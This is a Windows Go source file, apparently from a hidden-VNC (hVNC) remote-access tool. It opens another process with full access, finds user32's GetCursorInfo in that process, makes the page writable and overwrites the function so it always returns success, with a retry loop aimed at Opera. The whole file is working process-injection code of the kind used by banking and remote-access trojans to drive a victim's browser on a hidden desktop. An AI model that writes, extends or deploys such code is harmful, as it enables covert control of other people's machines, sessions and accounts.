//go:build windows

package capture

import (
	"fmt"
	"log"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	procGetProcAddress       = kernel32.NewProc("GetProcAddress")
	procLoadLibraryW         = kernel32.NewProc("LoadLibraryW")
	procVirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
	procReadProcessMemory    = kernel32.NewProc("ReadProcessMemory")
	procEnumProcessModules   = psapi.NewProc("EnumProcessModulesEx")
	procGetModuleFileNameExW = psapi.NewProc("GetModuleFileNameExW")
)

var psapi = syscall.NewLazyDLL("psapi.dll")

const (
	pageExecuteReadWrite = 0x40
	listModulesAll       = 0x03
)

func patchGetCursorInfo(pid uint32) error {
	addr, err := remoteGetProcAddress(pid, "user32.dll", "GetCursorInfo")
	if err != nil {
		return fmt.Errorf("find GetCursorInfo: %w", err)
	}

	// mov eax, 1; ret
	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}

	hProcess, _, callErr := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS_INJ), 0, uintptr(pid))
	if hProcess == 0 {
		return fmt.Errorf("OpenProcess PID %d: %v", pid, callErr)
	}
	defer procCloseHandle.Call(hProcess)

	var oldProtect uint32
	ret, _, callErr := procVirtualProtectEx.Call(hProcess, addr, uintptr(len(patch)),
		pageExecuteReadWrite, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return fmt.Errorf("VirtualProtectEx: %v", callErr)
	}

	var written uintptr
	ret, _, callErr = procWriteProcessMemory.Call(hProcess, addr,
		uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)),
		uintptr(unsafe.Pointer(&written)))
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", callErr)
	}

	verify := make([]byte, len(patch))
	var read uintptr
	procReadProcessMemory.Call(hProcess, addr,
		uintptr(unsafe.Pointer(&verify[0])), uintptr(len(verify)),
		uintptr(unsafe.Pointer(&read)))
	if int(read) == len(patch) {
		ok := true
		for i := range patch {
			if verify[i] != patch[i] {
				ok = false
				break
			}
		}
		if !ok {
			log.Printf("hvnc patch: verification mismatch for PID %d", pid)
		}
	}

	var dummy uint32
	procVirtualProtectEx.Call(hProcess, addr, uintptr(len(patch)),
		uintptr(oldProtect), uintptr(unsafe.Pointer(&dummy)))

	return nil
}

func remoteGetProcAddress(pid uint32, dllName, funcName string) (uintptr, error) {
	dllNameUTF16, _ := syscall.UTF16PtrFromString(dllName)
	localModule, _, callErr := procLoadLibraryW.Call(uintptr(unsafe.Pointer(dllNameUTF16)))
	if localModule == 0 {
		return 0, fmt.Errorf("LoadLibrary %s: %v", dllName, callErr)
	}

	funcNameBytes, _ := syscall.BytePtrFromString(funcName)
	localFunc, _, callErr := procGetProcAddress.Call(localModule, uintptr(unsafe.Pointer(funcNameBytes)))
	if localFunc == 0 {
		return 0, fmt.Errorf("GetProcAddress %s!%s: %v", dllName, funcName, callErr)
	}

	offset := localFunc - localModule

	remoteBase, err := getRemoteModuleBase(pid, dllName)
	if err != nil {
		return 0, err
	}

	return remoteBase + offset, nil
}

func getRemoteModuleBase(pid uint32, moduleName string) (uintptr, error) {
	hProcess, _, callErr := procOpenProcess.Call(
		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ), 0, uintptr(pid))
	if hProcess == 0 {
		return 0, fmt.Errorf("OpenProcess PID %d: %v", pid, callErr)
	}
	defer procCloseHandle.Call(hProcess)

	var modules [1024]uintptr
	var cbNeeded uint32
	ret, _, callErr := procEnumProcessModules.Call(hProcess,
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules))*unsafe.Sizeof(modules[0]),
		uintptr(unsafe.Pointer(&cbNeeded)),
		listModulesAll)
	if ret == 0 {
		return 0, fmt.Errorf("EnumProcessModulesEx: %v", callErr)
	}

	count := int(cbNeeded) / int(unsafe.Sizeof(modules[0]))
	target := strings.ToLower(moduleName)

	var nameBuf [260]uint16
	for i := 0; i < count; i++ {
		n, _, _ := procGetModuleFileNameExW.Call(hProcess, modules[i],
			uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
		if n == 0 {
			continue
		}
		fullPath := syscall.UTF16ToString(nameBuf[:n])
		baseName := strings.ToLower(fullPath)
		if idx := strings.LastIndexByte(baseName, '\\'); idx >= 0 {
			baseName = baseName[idx+1:]
		}
		if baseName == target || baseName == target+".dll" {
			return modules[i], nil
		}
	}

	return 0, fmt.Errorf("module %s not found in PID %d", moduleName, pid)
}

func patchOperaAsync(pid uint32, maxRetries int, delay time.Duration) {
	for attempt := 0; attempt < maxRetries; attempt++ {
		if attempt > 0 {
			time.Sleep(delay)
		}
		if err := patchGetCursorInfo(pid); err != nil {
			log.Printf("hvnc patch: attempt %d/%d for PID %d failed: %v", attempt+1, maxRetries, pid, err)
			continue
		}
		log.Printf("hvnc patch: successfully patched GetCursorInfo in PID %d", pid)
		return
	}
	log.Printf("hvnc patch: all %d attempts failed for PID %d", maxRetries, pid)
}
